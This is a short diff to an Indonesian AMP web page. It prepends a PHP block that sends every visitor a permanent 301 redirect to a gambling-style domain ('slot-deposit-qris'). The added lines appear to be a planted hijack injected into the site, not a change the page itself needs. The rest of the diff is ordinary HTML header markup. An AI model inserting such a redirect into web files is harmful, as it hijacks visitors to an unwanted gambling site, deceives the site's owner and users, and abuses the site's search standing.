@@ -1,3 +1,6 @@
+<?php
+header ("Location: http://slot-deposit-qris.animate.style/", true, 301);
+?>
 <!doctype html>
 <html lang="id" amp i-amphtml-binding i-amphtml-layout i-amphtml-no-boilerplate transformed="self;v=1" itemscope="itemscope" itemtype="https://schema.org/WebPage">
 <head>
